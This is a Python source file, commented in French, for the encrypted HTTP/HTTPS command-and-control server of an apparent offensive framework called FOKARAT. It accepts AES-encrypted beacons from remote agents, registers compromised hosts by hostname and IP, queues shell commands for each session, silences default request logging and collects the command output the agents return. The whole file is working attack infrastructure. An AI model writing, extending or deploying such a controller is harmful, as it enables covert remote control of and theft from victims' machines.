"""
FOKARAT - Serveur C2 HTTP/HTTPS chiffré
Reçoit les connexions des agents, exécute les commandes, renvoie les résultats.
"""
import os
import json
import base64
import threading
import time
import secrets
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

from core.logger import Logger
from modules.c2.crypto_channel import C2Crypto
from modules.c2.session_manager import session_manager, Session

logger = Logger()


class C2HTTPServer:
    """
    Serveur C2 HTTP avec chiffrement AES-256-GCM.
    Les agents POST /beacon avec du contenu chiffré.
    """

    def __init__(self, host="0.0.0.0", port=8443, session_key: bytes = None, use_ssl=False, cert_file=None, key_file=None):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.cert_file = cert_file
        self.key_file = key_file
        self.session_key = session_key or secrets.token_bytes(32)
        self.running = False
        self._thread = None
        self._httpd = None
        self.pending_commands = {}  # session_id -> list de commandes

        # Enregistre les commandes en attente par session
        self.command_queue = {}  # session_id -> [cmd1, cmd2, ...]

    def start(self):
        """Démarre le serveur C2 en arrière-plan."""
        if self.running:
            logger.warning("Serveur C2 déjà actif.")
            return

        handler = self._make_handler()
        self._httpd = HTTPServer((self.host, self.port), handler)

        if self.use_ssl:
            import ssl
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(certfile=self.cert_file, keyfile=self.key_file)
            self._httpd.socket = context.wrap_socket(self._httpd.socket, server_side=True)

        self._thread = threading.Thread(target=self._httpd.serve_forever, daemon=True)
        self._thread.start()
        self.running = True

        proto = "HTTPS" if self.use_ssl else "HTTP"
        logger.success(f"Serveur C2 {proto} actif sur {self.host}:{self.port}")
        logger.info(f"Session key (base64) : {base64.b64encode(self.session_key).decode()}")

    def stop(self):
        if self._httpd:
            self._httpd.shutdown()
            self._httpd.server_close()
        self.running = False
        logger.info("Serveur C2 arrêté.")

    def queue_command(self, session_id: str, command: str):
        """Ajoute une commande à envoyer à une session."""
        if session_id not in self.command_queue:
            self.command_queue[session_id] = []
        self.command_queue[session_id].append(command)
        logger.info(f"Commande en file pour {session_id} : {command}")

    def _make_handler(self):
        server = self

        class C2Handler(BaseHTTPRequestHandler):
            def log_message(self, fmt, *args):
                # Silence les logs HTTP par défaut
                pass

            def _get_crypto_for_session(self, session_id):
                s = session_manager.get_session(session_id)
                if s:
                    return s.crypto
                return C2Crypto(server.session_key)

            def do_POST(self):
                path = urlparse(self.path).path
                if path != "/beacon":
                    self.send_error(404)
                    return

                try:
                    length = int(self.headers.get("Content-Length", 0))
                    body = self.rfile.read(length)
                    payload = json.loads(body.decode("utf-8"))

                    session_id = payload.get("session_id")
                    encrypted_data = payload.get("data")

                    crypto = self._get_crypto_for_session(session_id)
                    decrypted = crypto.decrypt_str(encrypted_data)
                    msg = json.loads(decrypted)

                    # Traite le message selon son type
                    msg_type = msg.get("type", "checkin")

                    if msg_type == "checkin":
                        self._handle_checkin(session_id, msg, crypto)
                    elif msg_type == "result":
                        self._handle_result(session_id, msg)

                    # Récupère les commandes en attente
                    commands = server.command_queue.get(session_id, [])
                    server.command_queue[session_id] = []

                    response = {"commands": commands}
                    enc_response = crypto.encrypt_str(json.dumps(response))

                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({"data": enc_response}).encode())

                except Exception as e:
                    logger.error(f"Erreur C2 beacon : {e}")
                    self.send_error(500)

            def _handle_checkin(self, session_id, msg, crypto):
                """Gère un checkin d'agent."""
                session = session_manager.get_session(session_id)

                if not session:
                    # Nouvel agent
                    agent_info = msg.get("info", {})
                    agent_info["ip"] = self.client_address[0]
                    session_manager.create_session(agent_info, crypto)
                    logger.success(f"Agent connecté : {agent_info.get('hostname', '?')} @ {agent_info['ip']}")
                else:
                    session.last_seen = time.time()
                    session.alive = True

            def _handle_result(self, session_id, msg):
                """Gère un résultat de commande."""
                session = session_manager.get_session(session_id)
                if not session:
                    return
                session.last_seen = time.time()
                cmd = msg.get("command", "")
                output = msg.get("output", "")
                session.commands_history.append({"command": cmd, "output": output, "ts": time.time()})
                logger.success(f"[{session_id[:8]}] $ {cmd}")
                if output:
                    logger.info(f"    -> {output[:300]}")

        return C2Handler